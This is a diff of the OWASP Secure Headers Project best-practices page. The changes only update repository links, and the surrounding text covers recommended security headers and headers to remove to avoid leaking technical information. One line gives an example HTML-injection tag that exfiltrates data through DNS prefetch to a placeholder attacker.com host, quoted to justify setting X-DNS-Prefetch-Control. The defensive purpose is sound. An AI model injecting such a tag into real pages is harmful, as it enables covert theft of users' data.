@@ -23,7 +23,7 @@ Please note the best practices below suggest methods to change web server config
 
 The following section proposes a configuration for the [actively supported and working draft security headers](01_headers.md#response-headers).
 
-💡 Additional information about HTTP security headers on [OpenCRE](https://opencre.org/cre/636-347?name=OWASP+Secure+Headers+Project&section=configuration&link=https%3A%2F%2Fgithub.com%2FOWASP%2Fwww-project-secure-headers%2Fblob%2Fmaster%2Fmainsite%2F03_best_practices.md%23configuration-proposal).
+💡 Additional information about HTTP security headers on [OpenCRE](https://opencre.org/cre/636-347?name=OWASP+Secure+Headers+Project&section=configuration&link=https%3A%2F%2Fgithub.com%2FOWASP%2Fsecure-headers-project%2Fblob%2Fmaster%2Fmainsite%2F03_best_practices.md%23configuration-proposal).
 
 📖 The headers proposed below can be applied both in the context of a *classic web application* and in that of a *web API*:
 
@@ -36,7 +36,7 @@ The following section proposes a configuration for the [actively supported and w
 * Experimental value `"executionContexts"` is not supported by Chromium version `140.0.7292.0`.
 * Experimental values `"executionContexts"`, `"prefetchCache"`, `"prerenderCache"` and `"clientHints"` are not supported by Firefox version `141.0.3`.
 
-🚩 The header `X-DNS-Prefetch-Control` seems currently only supported by [Chromium based browsers](https://github.com/OWASP/www-project-secure-headers/issues/201#issuecomment-3190756900) and more precisely Chrome for the `off` instruction. Therefore, as Chrome is highly used ([source](https://gs.statcounter.com/browser-market-share)), the proposal is to add the header on HTTP response which either:
+🚩 The header `X-DNS-Prefetch-Control` seems currently only supported by [Chromium based browsers](https://github.com/OWASP/secure-headers-project/issues/201#issuecomment-3190756900) and more precisely Chrome for the `off` instruction. Therefore, as Chrome is highly used ([source](https://gs.statcounter.com/browser-market-share)), the proposal is to add the header on HTTP response which either:
 
 * Return sensitive or private content (commonly called [PII](https://en.wikipedia.org/wiki/Personal_data)).
 * Prone to HTML injection where an attacker can inject a tag `<link rel="dns-prefetch" href="//[exfiltrated data encoded].attacker.com">` to exfiltrate data quietly via DNS or be notified via DNS when the victim rendered the response in a browser.
@@ -45,7 +45,7 @@ The following section proposes a configuration for the [actively supported and w
 
 🔬 For the header `Permissions-Policy`, as it is currently only supported by [Chromium based browsers](https://caniuse.com/permissions-policy), the proposed value was generated with this [site](https://www.permissionspolicy.com/) and tested against the version `140.0.7292.0` of [Chromium](https://chromium.woolyss.com/download/en/) to only specify supported features.
 
-💡 Content of the table below is also provided, as JSON, via this [file](https://github.com/OWASP/www-project-secure-headers/blob/master/ci/headers_add.json) (automatically updated).
+💡 Content of the table below is also provided, as JSON, via this [file](https://github.com/OWASP/secure-headers-project/blob/master/ci/headers_add.json) (automatically updated).
 
 <!-- HEADERS_ADD_TABLE_START -->
 
@@ -73,7 +73,7 @@ The following section proposes a configuration for the [actively supported and w
 
 This section provides a collection of HTTP response headers to remove, when possible, from any HTTP response to prevent any [disclosure of technical information](https://cwe.mitre.org/data/definitions/200.html) about environment. The following list of headers can be used to configure a [reverse proxy](https://www.nginx.com/resources/glossary/reverse-proxy-server/) or a [web application firewall](https://en.wikipedia.org/wiki/Web_application_firewall) to handle removal operation of the mentioned headers.
 
-💡 Additional information about technical information disclosure in HTTP header on [OpenCRE](https://www.opencre.org/cre/233-748?name=OWASP+Secure+Headers+Project&section=Prevent+information+disclosure+via+HTTP+headers&link=https%3A%2F%2Fgithub.com%2FOWASP%2Fwww-project-secure-headers%2Fblob%2Fmaster%2Fmainsite%2F03_best_practices.md%23prevent-information-disclosure-via-http-headers).
+💡 Additional information about technical information disclosure in HTTP header on [OpenCRE](https://www.opencre.org/cre/233-748?name=OWASP+Secure+Headers+Project&section=Prevent+information+disclosure+via+HTTP+headers&link=https%3A%2F%2Fgithub.com%2FOWASP%2Fsecure-headers-project%2Fblob%2Fmaster%2Fmainsite%2F03_best_practices.md%23prevent-information-disclosure-via-http-headers).
 
 📖 When possible, a reference link about the documentation of the header is provided.
 
@@ -91,7 +91,7 @@ This section provides a collection of HTTP response headers to remove, when poss
   * `Basic realm="NETGEAR D7800`
 * Ensure to update the value of the attribute **[realm](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/WWW-Authenticate#realm)** to something generic like `RestrictedArea`.  
 
-💡 Content of the table below is also provided, as JSON, via this [file](https://github.com/OWASP/www-project-secure-headers/blob/master/ci/headers_remove.json) (automatically updated).
+💡 Content of the table below is also provided, as JSON, via this [file](https://github.com/OWASP/secure-headers-project/blob/master/ci/headers_remove.json) (automatically updated).
 
 <!-- HEADERS_REMOVE_TABLE_START -->
 
@@ -106,7 +106,7 @@ This section provides a collection of HTTP response headers to remove, when poss
 | [SourceMap](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/SourceMap)                                                                              | `https://mysite.com/js/mylib.js.map`             | Links generated code to a [source map](https://developer.mozilla.org/en-US/docs/Tools/Debugger/How_to/Use_a_source_map) file, enabling the browser to reconstruct the original source and present the reconstructed original in the debugger.              |
 | [X-SourceMap](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/SourceMap)                                                                            | `https://mysite.com/js/mylib.js.map`             | Links generated code to a [source map](https://developer.mozilla.org/en-US/docs/Tools/Debugger/How_to/Use_a_source_map) file, enabling the browser to reconstruct the original source and present the reconstructed original in the debugger.              |
 | X-AspNetMvc-Version                                                                                                                                           | `5.2`                                            | Contain the version of the ASP .Net MVC framework in use.                                                                                                                                                                                                  |
-| X-AspNet-Version                                                                                                                                              | `4.0.30319`                                      | Contain the version of the ASP .Net framework Common Language Runtime (CLR) in use (see [here](https://github.com/OWASP/www-project-secure-headers/issues/215) for more details).                                                                          |
+| X-AspNet-Version                                                                                                                                              | `4.0.30319`                                      | Contain the version of the ASP .Net framework Common Language Runtime (CLR) in use (see [here](https://github.com/OWASP/secure-headers-project/issues/215) for more details).                                                                              |
 | X-SourceFiles                                                                                                                                                 | `=?UTF-8?B?QzpcVXNlcnN?=`                        | Contain information needed by the .Net SDK debugger during debugging operation on a project.                                                                                                                                                               |
 | X-Redirect-By                                                                                                                                                 | `TYPO3 Shortcut/Mountpoint`                      | Specifies the component that is responsible for a particular redirect (source [Wikipedia](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields)).                                                                                                      |
 | X-Generator                                                                                                                                                   | `Drupal 8`                                       | Contain the information about the [CMS](https://en.wikipedia.org/wiki/Content_management_system) that generated the HTTP response.                                                                                                                         |
